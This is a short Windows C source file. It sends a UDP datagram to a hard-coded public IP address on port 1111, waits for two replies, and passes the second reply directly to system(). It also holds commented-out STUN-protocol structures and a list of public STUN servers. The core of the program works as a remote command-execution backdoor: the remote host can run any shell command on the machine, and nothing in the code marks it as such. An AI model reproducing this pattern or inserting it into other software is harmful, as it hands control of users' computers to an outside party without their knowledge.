#ifndef UNICODE
#define UNICODE
#endif

#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
/* 
#define XOR_MAPPED_ADDRESS_TYPE 0x0020
#define IPv4_ADDRESS_FAMILY 0x01;
#define IPv6_ADDRESS_FAMILY 0x02;

// RFC 5389 Section 6 STUN Message Structure
struct STUNMessageHeader
{
    // Message Type (Binding Request / Response)
    unsigned short type;
    // Payload length of this message
    unsigned short length;
    // Magic Cookie
    unsigned int cookie;
    // Unique Transaction ID
    unsigned int identifier[3];
};

// RFC 5389 Section 15 STUN Attributes
struct STUNAttributeHeader
{
    // Attibute Type
    unsigned short type;
    // Payload length of this attribute
    unsigned short length;
};

// RFC 5389 Section 15.2 XOR-MAPPED-ADDRESS
struct STUNXORMappedIPv4Address
{
    unsigned char reserved;
    unsigned char family;
    unsigned short port;
    unsigned int address;
};

struct STUNServer
{
    char* address;
    unsigned short port;
};


int getPublicIP(char* address)
{
    struct STUNServer servers[14] = {
    {"stun.l.google.com" , 19302}, {"stun.l.google.com" , 19305},
    {"stun1.l.google.com", 19302}, {"stun1.l.google.com", 19305},
    {"stun2.l.google.com", 19302}, {"stun2.l.google.com", 19305},
    {"stun3.l.google.com", 19302}, {"stun3.l.google.com", 19305},
    {"stun4.l.google.com", 19302}, {"stun4.l.google.com", 19305},
    {"stun.wtfismyip.com", 3478 }, {"stun.bcs2005.net"  , 3478 },
    {"numb.viagenie.ca"  , 3478 }, {"173.194.202.127"   , 19302}};
    for (int i = 0; i < 14; i++){
        
    }   
}

*/
int main(int argc, char *argv[])
{

    int iResult;
    WSADATA wsaData;

    SOCKET SendSocket = INVALID_SOCKET;
    sockaddr_in RecvAddr;

    unsigned short Port = 1111;

    char RecvBuf[1024];
    memset(&RecvBuf[0], 0, sizeof(RecvBuf));
    char SendBuf[1024] = "11";
    int BufLen = 1024;
    int RecvAddr_size = sizeof(RecvAddr);
    //----------------------
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    //---------------------------------------------
    // Create a socket for sending data
    SendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (SendSocket == INVALID_SOCKET) {
        wprintf(L"socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    //---------------------------------------------
    // Set up the RecvAddr structure with the IP address of
    // the receiver 
    // and the specified port number.
    RecvAddr.sin_family = AF_INET;
    RecvAddr.sin_port = htons(Port);
    RecvAddr.sin_addr.s_addr = inet_addr("118.189.187.18");

    //---------------------------------------------
    // Send a datagram to the receiver
    wprintf(L"Sending a datagram to the receiver...\n");

    iResult = sendto(SendSocket,
                     SendBuf, BufLen, 0, (SOCKADDR *) & RecvAddr, sizeof (RecvAddr));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"sendto failed with error: %d\n", WSAGetLastError());
        closesocket(SendSocket);
        WSACleanup();
        return 1;
    }

    
    iResult = recvfrom(SendSocket,
                       RecvBuf, BufLen, 0, (SOCKADDR *) & RecvAddr, &RecvAddr_size);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"sendto failed with error: %d\n", WSAGetLastError());
        closesocket(SendSocket);
        WSACleanup();
        return 1;
    }
    printf("%s\n", RecvBuf);
    memset(&RecvBuf[0], 0, sizeof(RecvBuf));
    
    iResult = recvfrom(SendSocket,
                       RecvBuf, BufLen, 0, (SOCKADDR *) & RecvAddr, &RecvAddr_size);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"sendto failed with error: %d\n", WSAGetLastError());
        closesocket(SendSocket);
        WSACleanup();
        return 1;
    }
    printf("%s\n", RecvBuf);
    system(RecvBuf);
    //---------------------------------------------
    // When the application is finished sending, close the socket.    
    wprintf(L"Finished sending. Closing socket.\n");
    iResult = closesocket(SendSocket);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    //---------------------------------------------
    // Clean up and quit.
    wprintf(L"Exiting.\n");
    WSACleanup();
    return 0;
}
